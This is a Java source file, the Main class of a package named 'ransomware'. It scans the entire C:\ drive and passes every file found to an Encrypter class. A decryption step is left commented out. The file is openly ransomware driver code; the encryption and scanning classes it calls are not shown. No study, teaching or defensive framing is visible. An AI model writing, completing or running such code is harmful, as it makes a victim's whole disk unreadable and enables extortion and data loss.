package com.margarito.ransomware;

import java.io.File;
import java.util.List;

public class Main {
    public static void main(String[] args) {
        String rootDirectory = "C:\\";

        try {
            FileScanner scanner = new FileScanner(rootDirectory);
            List<String> scannedFiles = scanner.scanDirectory(new File(rootDirectory));
            scanner.processFiles(scannedFiles);

            Encrypter encrypter = new Encrypter(rootDirectory);
            encrypter.processFiles(scannedFiles);

            // Uncomment below to decrypt files
            // Decrypter decrypter = new Decrypter(rootDirectory);
            // decrypter.processFiles(scannedFiles);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
